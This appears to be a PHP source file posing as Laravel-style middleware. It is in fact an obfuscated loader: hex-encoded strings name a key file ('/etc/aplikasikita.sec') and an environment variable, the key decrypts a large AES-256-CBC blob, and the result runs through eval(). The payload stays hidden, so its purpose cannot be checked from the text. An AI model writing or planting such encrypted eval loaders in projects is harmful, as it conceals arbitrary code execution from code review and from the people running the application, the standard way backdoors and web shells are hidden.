<?php
namespace App\Http\Middleware;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('3RD3yYIqDN+bGt5+BLFsww==');

$c=base64_decode(

'ERy8M20GkxkW6ujYBFCe8jkwc1pL3z7bTwfrST6icuO0BEiX9JfJYBAyvGuclTPWzexnwJeTbh3v' .
'tM2DHVZPMHlPRIt+ry2xr4+ykUI6qBL2Dh7o4n5zFkM6ao40bKYOZXmTrq/JejnZiElFLsUYi9SD' .
'bXt/po6Dj5oM/gmwK7GwlbIa4wf5A7LzGwbVI7DUrzdTk99MRBjXB5E8wdTzDl1NEHJDm0hxeR8C' .
'QaIwdiBLc4TKC9Y8CNdPl4N1sDJRDFOYmqXxn73MBO8sGviVA3bvSGhh2+pmczozgrdluVP2g5oy' .
'di4H5DMRKhNhs8st8RlH6rH5+7tIxuKuxKWAe1Qu8GWAtqVDq1gcjHrlw+LpJ6dkfT2EP6EtTYL1' .
'is4rWtgSFUem3yCPEyB7ICFlEkuu79sNJ8Ui86qwV7rl+dZ8AhWTfoTwFg6vAybxkCVv5XC9H6MA' .
'kFeTusD5JfIDm6BwDwpAKoGJfil8KGT6Xns66PU9mqbKFw/eEMvpUT2aXiOZAgrCJMnNxD7XPIDv' .
'anvvUNNDXjP3dWjyFsJRPqJPlos/LvrSwhwCJ3mhOtSf482k4WHuFUlSRbbXdy3g7AREpPHFJBVX' .
'CVES6/YYxDJq3SnVxSm/QcbW/4L+i8LGxpG1swCbq5ih/R+cbNQOH/C5piBcN8iJVxB/ARIjFB0i' .
'bcYuBxcoqyvg6EWfx7L0krlG5f64DmyapFclCX1PPuJvY77P1Xrpj280p3DuYDAuwa0yUZQWIflI' .
'm8u5RIBYK9ngrMzwIJyD4d8b+Dfg8myjZZ1tUcusslIAk25py+71ieNq8ipKA9B5b4w2am67VRVW' .
'mneYMogNPgb3X5fwx5hSIpkEo5xH01FAoIBAJfNi8lkjaPkxtfmLTsNwk+exF2AlFxrPcieBZzAt' .
'mzAV+I1Vx+WwBSQTVrkePlhLjVblS5Axy+b8bB/W4ctmEQAS+8JT9sowOWft6eoQwd8puxWOdWY9' .
'CPjnPNu44mda535L1ucvSjUCH0Ne0/lQCazbbIKExL5rWhu9jJ3zL2AuNAEZMdFUxd9fM1X8kOou' .
'6WVGmftvHFBh/Vm/JIO51u7KZes0PRNAqNIyvKxs+eWq7NnseEufoZX9VYIgO5tUGa1t9Ogk74z6' .
'0KDnwdcWIl05boIIJbmexi3CTJ2R73euu2RgsAGPNLQqgZcXgGbjeYqQ32PzWTfgbFNu/FIm8Vsl' .
'GBbPMNrlD16dY05wbUCVa0UBJrNlAa9Ubf5fiBuXB8+XlGwdGT+QUIb9aHJEhQR3U/Xr/jX7PKUK' .
'NNTboRcd7R7lvrVpEvG7vd3dXuwJkT4U6eGpGINioVd5fYHAyByXrsyJitBDVRGlsCFlR5CEV/R1' .
'UM15ePNjzX48Vh5iY5DRgFdSt8Ymy1rNisdq8em6RhH/Pyf87mRBb3LaKuPDyy5nV3lklLnXyKep' .
'vj00RYmofFe8u++Nz7d90bADHWpPe5nJpkCo/JD7D+M3h3fnrHf59MoRD0WD7K2qBuhuWBjVmkNC' .
'jidwxPX0PeQHrEYzv89sZRRJxEz9+dqGJU/8eA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

